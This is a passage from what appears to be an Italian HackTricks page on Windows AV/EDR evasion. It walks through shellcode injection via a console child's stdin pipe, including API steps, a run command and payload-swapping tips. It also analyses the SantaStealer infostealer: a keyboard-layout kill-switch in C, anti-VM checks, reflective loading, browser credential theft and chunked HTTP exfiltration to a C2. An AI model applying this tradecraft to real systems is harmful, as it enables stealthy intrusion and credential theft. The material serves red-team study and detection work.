Anche un processo figlio di una console interattiva può essere usato come **primitiva di trasferimento del payload**. L'injector reindirizza lo standard input del processo figlio a una pipe e invia un marker seguito dallo shellcode. Dopo che il programma della console legge i dati nella propria memoria privata, l'injector individua quel buffer, lo rende eseguibile e redirige un thread del processo figlio verso di esso. Questo evita `VirtualAllocEx` e `WriteProcessMemory`, ma si tratta comunque di process injection, non di un bypass EDR generico.<sup>[[41]](#references)</sup>

Nonostante la descrizione "named-pipe", l'implementazione di riferimento chiama `CreatePipe`, che crea una **pipe anonima**. Windows implementa internamente le pipe anonime con oggetti pipe dotati di nomi univoci, ma la PoC non seleziona un percorso `\\.\pipe\<name>` né chiama `CreateNamedPipe`. Crea handle ereditabili con un descrittore di sicurezza predefinito, inserisce l'handle di lettura in `STARTUPINFO.hStdInput`, imposta `STARTF_USESTDHANDLES` e avvia un nuovo processo figlio abilitando l'ereditarietà degli handle. Pertanto, questa PoC avvia l'eseguibile console fornito; non collega la pipe a un processo esistente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Flusso di lavoro di riferimento

L'implementazione usa la seguente catena:<sup>[[41]](#references)</sup>

1. Crea coppie di pipe anonime per `STDIN` e `STDOUT` del processo figlio. Disabilita l'ereditarietà sui due handle lato processo padre e chiude nel processo padre i duplicati lato processo figlio dopo la creazione del processo.
2. Avvia un eseguibile interattivo come `netsh.exe` o `nslookup.exe` con `CREATE_NEW_CONSOLE`. Il processo figlio eredita gli handle standard reindirizzati.
3. Invia l'intero array binario `rawData` tramite `WriteFile` usando l'handle `STDIN` lato processo padre. Il programma della console consuma i byte e ne lascia una copia in una delle proprie regioni private di memoria sottoposte a commit.
4. Esplora lo spazio degli indirizzi del processo figlio con `VirtualQueryEx`, legge le regioni candidate `MEM_PRIVATE` con `ReadProcessMemory` e cerca il marker all'inizio di `rawData`.
5. Modifica il buffer individuato impostandolo su `PAGE_EXECUTE_READWRITE` con `VirtualProtectEx`.
6. Individua il thread principale, lo sospende, imposta `RIP` su `found_address + 0x19` con `NtSetContextThread` e lo riprende.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L'implementazione fornita è specifica per x64: modifica `CONTEXT.Rip` e il payload incorporato è shellcode x64. `rawData` inizia con un marker di 25 byte, quindi i byte eseguibili iniziano all'offset esadecimale `0x19`. Quando sostituisci il payload, mantieni questa struttura oppure aggiorna insieme il marker, il vettore di ricerca, la dimensione dell'array e l'offset di esecuzione. I commenti nel codice indicano inoltre `0x0A`, `0x0D` e `0x1A` come caratteri non validi. Questo workflow non modifica il token o i privilegi del processo figlio.<sup>[[41]](#references)</sup>

Per piccoli helper nativi e schemi di compilazione dei payload, vedi [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Tecniche di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (detto anche BluelineStealer) mostra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Verifica del layout della tastiera e ritardo nel sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi di non attivarsi mai nelle aree escluse e lasciando un artefatto utile per l'hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logica `check_antivm` a più livelli

- La variante A scorre l’elenco dei processi, calcola un checksum rolling personalizzato per ogni nome e lo confronta con blocklist incorporate di debugger/sandbox; ripete il calcolo del checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà del sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le VirtualBox Additions ed esegue controlli temporali intorno alle sospensioni per individuare il single-stepping. Qualsiasi rilevamento interrompe l’esecuzione prima dell’avvio dei moduli.

### Helper fileless + caricamento reflective doppio con ChaCha20

- La DLL/EXE principale incorpora un helper per le credenziali Chromium, che viene salvato su disco oppure mappato manualmente in memoria; la modalità fileless risolve da sé importazioni e rilocazioni, quindi non vengono scritti artefatti dell’helper.
- L’helper contiene una DLL di secondo stadio, cifrata due volte con ChaCha20 (due chiavi da 32 byte e nonce da 12 byte). Dopo entrambe le operazioni, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective con direct syscall per iniettarsi in un browser Chromium attivo, ereditano le chiavi AppBound Encryption e decifrano password/cookie/carte di credito direttamente dai database SQLite, nonostante le protezioni ABE.

### Raccolta modulare in memoria ed esfiltrazione HTTP a blocchi

- `create_memory_based_log` scorre una tabella globale di puntatori a funzione `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser e così via). Ogni thread scrive i risultati in buffer condivisi e segnala il numero di file al termine di un’attesa di join di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente e salvato come `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 secondi e trasmette l’archivio in blocchi da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, contraffacendo un boundary `multipart/form-data` del browser (`----WebKitFormBoundary***`). Ogni blocco include `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opzionale, mentre l’ultimo aggiunge `complete: true` per segnalare al C2 che il riassemblaggio è terminato.

## References

- [1] [Tecniche avanzate di evasione: Module Stomping di precisione](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: niente più immunità per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC per lo spoofing del call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena d’infezione e offuscamento basato su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle librerie a collegamento dinamico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con la protezione Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Spezzare la barriera protettiva di Windows Defender con la tecnica del reindirizzamento delle cartelle](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento al comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Dietro la cortina pura: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arriva in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittazione della Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: contrastare il malware Node.js con il tracciamento delle API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La Bella Addormentata: mettere Adaptix a dormire con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Avvelenamento dei parametri di processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La Bella Addormentata II: CFG, CET e spoofing dello stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento del sonno con Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusare di Chrome Remote Desktop nelle operazioni Red Team: una guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: trasformare il driver di remediation di Defender in una primitiva per operazioni kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Codice di supporto MDSec per Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creare funzioni auto-mascheranti con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Codice sorgente InjectSetConsole di TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funzione CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creazione di un processo figlio con input e output reindirizzati](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
